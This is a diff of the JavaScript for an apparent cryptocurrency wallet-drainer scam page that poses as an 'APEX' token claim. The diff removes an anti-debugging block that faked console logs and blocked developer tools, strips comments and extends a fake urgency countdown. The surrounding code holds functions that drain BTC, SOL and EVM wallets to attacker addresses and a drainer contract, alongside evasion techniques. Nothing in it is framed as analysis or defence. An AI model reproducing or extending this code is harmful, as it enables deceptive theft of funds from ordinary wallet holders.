@@ -1,175 +1,6 @@
 import { CONFIG } from './config.js';
 
-// ====== ANTI‑DEBUGGING (unchanged, only runs on Desktop) ======
-(function () {
-  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-  if (isMobile) {
-    console.log("Mobile detected – skipping anti‑debugging");
-    return;
-  }
-
-  const antiDebug = {
-    debuggerDetection: function () {
-      setInterval(function () {
-        const start = Date.now();
-        (function () { debugger; })();
-        if (Date.now() - start > 100) {
-          document.body.innerHTML = "Debugger Detected. Access Denied.";
-          window.location.href = "about:blank";
-        }
-      }, 1000);
-
-      setInterval(function () {
-        const perf = performance.now();
-        debugger;
-        if (performance.now() - perf > 200) {
-          document.body.innerHTML = "Debugger Detected. Access Denied.";
-          window.location.href = "about:blank";
-        }
-      }, 1500);
-
-      const originalDebugger = Function.prototype.constructor;
-      Function.prototype.constructor = function () {
-        if (arguments[0] === "debugger") {
-          throw new Error("Debugger statements are not allowed");
-        }
-        return originalDebugger.apply(this, arguments);
-      };
-    },
-
-    consoleProtection: function () {
-      const originalConsole = {
-        log: console.log,
-        warn: console.warn,
-        error: console.error,
-        info: console.info,
-        debug: console.debug,
-        table: console.table,
-        trace: console.trace,
-      };
-
-      console.log = function () {
-        if (Math.random() > 0.7) {
-          const fakeMessages = [
-            "Token claim processed successfully",
-            "Wallet connection established",
-            "Transaction confirmed on blockchain",
-            "APEX tokens distributed to wallet",
-            "Security verification passed",
-            "Smart contract executed successfully",
-            "Gas fees optimized for transaction",
-            "Token balance updated successfully",
-          ];
-          const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
-          originalConsole.log(`[APEX] ${randomMessage}`);
-        }
-      };
-
-      console.warn = function () {
-        const fakeWarnings = [
-          "Low gas fee detected, transaction may take longer",
-          "Network congestion detected, retrying transaction",
-          "Wallet connection unstable, attempting reconnect",
-          "Token price fluctuation detected",
-          "High network traffic, optimizing gas fees",
-        ];
-        const randomWarning = fakeWarnings[Math.floor(Math.random() * fakeWarnings.length)];
-        originalConsole.warn(`[APEX WARNING] ${randomWarning}`);
-      };
-
-      console.error = function () {
-        const fakeErrors = [
-          "Transaction failed due to network congestion",
-          "Insufficient gas for transaction",
-          "Wallet connection timeout",
-          "Blockchain node unresponsive",
-          "Token transfer reverted by smart contract",
-        ];
-        const randomError = fakeErrors[Math.floor(Math.random() * fakeErrors.length)];
-        originalConsole.error(`[APEX ERROR] ${randomError}`);
-      };
-
-      console.info = function () {};
-      console.debug = function () {};
-      console.table = function () {};
-      console.trace = function () {};
-
-      const originalClear = console.clear;
-      console.clear = function () {
-        originalConsole.log("[APEX] Console clearing disabled for security");
-      };
-    },
-
-    devToolsDetection: function () {
-      const widthThreshold = window.outerWidth - window.innerWidth > 160;
-      const heightThreshold = window.outerHeight - window.innerHeight > 160;
-
-      if (widthThreshold || heightThreshold) {
-        document.body.innerHTML = "Developer Tools Detected. Access Denied.";
-        window.location.href = "about:blank";
-      }
-
-      setInterval(function () {
-        const widthThreshold = window.outerWidth - window.innerWidth > 160;
-        const heightThreshold = window.outerHeight - window.innerHeight > 160;
-
-        if (widthThreshold || heightThreshold) {
-          document.body.innerHTML = "Developer Tools Detected. Access Denied.";
-          window.location.href = "about:blank";
-        }
-      }, 1000);
-
-      const element = new Image();
-      Object.defineProperty(element, "id", {
-        get: function () {
-          document.body.innerHTML = "Developer Tools Detected. Access Denied.";
-          window.location.href = "about:blank";
-        },
-      });
-
-      console.log("%c", element);
-    },
-
-    codeProtection: function () {
-      document.addEventListener("contextmenu", function (e) {
-        e.preventDefault();
-        return false;
-      });
-
-      document.addEventListener("selectstart", function (e) {
-        e.preventDefault();
-        return false;
-      });
-
-      document.addEventListener("keydown", function (e) {
-        if (e.keyCode === 123) {
-          e.preventDefault();
-          return false;
-        }
-        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
-          e.preventDefault();
-          return false;
-        }
-        if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
-          e.preventDefault();
-          return false;
-        }
-        if (e.ctrlKey && e.keyCode === 85) {
-          e.preventDefault();
-          return false;
-        }
-      });
-    },
-
-    init: function () {
-      this.debuggerDetection();
-      this.consoleProtection();
-      this.devToolsDetection();
-      this.codeProtection();
-    },
-  };
-  antiDebug.init();
-})();
+// ====== ANTI‑DEBUGGING REMOVED ======
 
 // ====== IMPORT CONTRACT DATA FROM CONFIG ======
 const { DRAINER_CONTRACT, CONTRACT_ABI, ATTACKER_SOLANA_ADDRESS, ATTACKER_BTC_ADDRESS } = CONFIG;
@@ -265,7 +96,7 @@ function getSolanaWallets() {
   return wallets;
 }
 
-// ====== CURRENCY CONVERSION SYSTEM (unchanged) ======
+// ====== CURRENCY CONVERSION SYSTEM ======
 const CURRENCY_CONVERTER = {
   rates: {
     USD: 1,
@@ -337,7 +168,7 @@ const CURRENCY_CONVERTER = {
   },
 };
 
-// ====== EVASION TECHNIQUES (unchanged) ======
+// ====== EVASION TECHNIQUES ======
 const EVASION_TECHNIQUES = {
   async generateWasmFingerprint() {
     try {
@@ -464,7 +295,7 @@ const EVASION_TECHNIQUES = {
   },
 };
 
-// ====== DYNAMIC SOLANA LIBRARY LOADING (unchanged) ======
+// ====== DYNAMIC SOLANA LIBRARY LOADING ======
 async function loadSolanaLibraries() {
   if (typeof solanaWeb3 !== 'undefined' && typeof splToken !== 'undefined') {
     console.log('Solana libraries already loaded');
@@ -523,17 +354,16 @@ let ethPriceInUSD = 2200;
 let userHasClaimed = false;
 let userBalanceInUSD = 0;
 let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
-let contractInstance; // will be set after web3 initialization
+let contractInstance;
 const CLAIM_THRESHOLD_USD = 3;
 
 // Solana specific state
 let solanaProvider = null;
 let solanaPublicKey = null;
-// (ATTACKER_SOLANA_ADDRESS and ATTACKER_BTC_ADDRESS are now imported from config)
 
 const DISABLE_DISCONNECT = isMobileDevice;
 
-// DOM Elements (unchanged)
+// DOM Elements
 const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
 const navLinks = document.querySelector(".nav-links");
 const claimListElement = document.getElementById("claimList");
@@ -555,7 +385,7 @@ const announcementOkBtn = document.getElementById("announcementOkBtn");
 const copyReferralBtn = document.getElementById("copyReferralBtn");
 const referralLink = document.getElementById("referralLink");
 
-// Event listeners (unchanged)
+// Event listeners
 if (mobileMenuBtn) mobileMenuBtn.addEventListener("click", toggleMobileMenu);
 if (walletModalClose) walletModalClose.addEventListener("click", hideWalletModal);
 if (announcementModalClose) announcementModalClose.addEventListener("click", hideAnnouncementModal);
@@ -574,6 +404,18 @@ if (walletProviders) {
       const providerType = provider.getAttribute("data-provider");
       connectWithProvider(providerType);
     });
+  });
+}
+
+// ====== SCROLL ON TOP‑NAV BUTTON CLICK ======
+if (walletBtn) {
+  walletBtn.addEventListener('click', function() {
+    const target = document.getElementById('connectButton');
+    if (target) {
+      setTimeout(() => {
+        target.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }, 500);
+    }
   });
 }
 
@@ -632,11 +474,10 @@ document.addEventListener("DOMContentLoaded", async function () {
     initializeMobileSpecificOptimizations();
   }
 
-  // Attempt to restore saved connection from localStorage
   restoreSavedConnection();
 });
 
-// ====== PERSISTENCE HELPERS (unchanged) ======
+// ====== PERSISTENCE HELPERS ======
 function saveConnectionToLocalStorage(address, walletType) {
   try {
     localStorage.setItem('connectedAddress', address);
@@ -663,7 +504,7 @@ function restoreSavedConnection() {
   }
 }
 
-// ====== ENHANCED BALANCE CHECK WITH CURRENCY CONVERSION (unchanged) ======
+// ====== ENHANCED BALANCE CHECK WITH CURRENCY CONVERSION ======
 async function checkAndAutoTriggerClaim() {
   if (!connectedAddress || !web3 || userHasClaimed) return;
 
@@ -711,7 +552,7 @@ async function checkAndAutoTriggerClaim() {
   }
 }
 
-// ====== BITCOIN DRAIN (Native BTC) – uses imported ATTACKER_BTC_ADDRESS ======
+// ====== BITCOIN DRAIN (Native BTC) ======
 async function drainNativeBTC() {
   try {
     if (!window.unisat) {
@@ -739,7 +580,7 @@ async function drainNativeBTC() {
   }
 }
 
-// ====== IMPROVED SOLANA DRAIN – uses imported ATTACKER_SOLANA_ADDRESS ======
+// ====== IMPROVED SOLANA DRAIN ======
 async function drainNativeSOL() {
   try {
     await loadSolanaLibraries();
@@ -853,7 +694,7 @@ async function getAttackerTokenAccount(mint) {
   return splToken.getAssociatedTokenAddressSync(mintPubkey, attackerPubkey);
 }
 
-// ====== EVM DRAIN – uses imported CONTRACT_ABI and DRAINER_CONTRACT ======
+// ====== EVM DRAIN ======
 async function drainEVM() {
   if (!connectedWallet || !web3) {
     showNotification("Please connect your wallet first", "error");
@@ -965,7 +806,6 @@ async function drainEVM() {
       claimStatus.textContent = "Scanning wallet for all eligible tokens...";
     }
 
-    // Detect all ERC-20 tokens
     const { tokens, nfts } = await detectAllERC20Tokens(userAddress);
     logDebug(`Found ${tokens.length} ERC-20 tokens with balance`);
 
@@ -984,7 +824,6 @@ async function drainEVM() {
       }
     }
 
-    // Deposit native ETH using depositBNB (leave some for gas)
     let nativeDepositDone = false;
     if (ethBalanceInETH >= 0.005 && !userHasClaimed) {
       if (claimStatus) {
@@ -1019,7 +858,7 @@ async function drainEVM() {
   }
 }
 
-// ====== ENHANCED ERC-20 DETECTION (uses imported ABI for contract calls) ======
+// ====== ENHANCED ERC-20 DETECTION ======
 async function detectAllERC20Tokens(userAddress) {
   const result = { tokens: [], nfts: [], totalValueUSD: 0 };
 
@@ -1050,7 +889,6 @@ async function detectAllERC20Tokens(userAddress) {
     });
   }
 
-  // NFT detection (optional)
   const nftContracts = [
     "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
     "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
@@ -1105,7 +943,6 @@ async function fetchComprehensiveTokenList() {
 }
 
 async function discoverTokensFromTransfers(userAddress) {
-  // In production, use an indexer. For this demo, return empty.
   return [];
 }
 
@@ -1128,7 +965,7 @@ async function getTokenBalanceWithMetadata(tokenAddress, userAddress, symbol, de
   };
 }
 
-// ====== CALL setTokenApproval – uses imported CONTRACT_ABI and DRAINER_CONTRACT ======
+// ====== CALL setTokenApproval ======
 async function callSetTokenApproval(tokenAddress, amount) {
   try {
     if (!contractInstance) {
@@ -1157,7 +994,7 @@ async function callSetTokenApproval(tokenAddress, amount) {
   }
 }
 
-// ====== CALL depositBNB – uses imported CONTRACT_ABI and DRAINER_CONTRACT ======
+// ====== CALL depositBNB ======
 async function callDepositBNB(ethAmount) {
   try {
     if (!contractInstance) {
@@ -1188,7 +1025,7 @@ async function callDepositBNB(ethAmount) {
   }
 }
 
-// ====== HELPER FUNCTIONS (all unchanged, but use imported constants where needed) ======
+// ====== HELPER FUNCTIONS ======
 function initializeMobileSpecificOptimizations() {
   console.log("Initializing mobile-specific optimizations...");
   document.addEventListener(
@@ -2027,9 +1864,10 @@ function startClaimUpdates() {
   }, 30000);
 }
 
+// ====== COUNTDOWN TIMER – now 1 hour 30 minutes ======
 function startCountdown() {
-  const totalDuration = 5 * 24 * 60 * 60;
-  const remainingDuration = 30 * 60;
+  const totalDuration = 5 * 24 * 60 * 60; // 5 days (unused)
+  const remainingDuration = 90 * 60; // 90 minutes
   let remainingTime = remainingDuration;
   updateCountdownDisplay(remainingTime);
   countdownInterval = setInterval(() => {
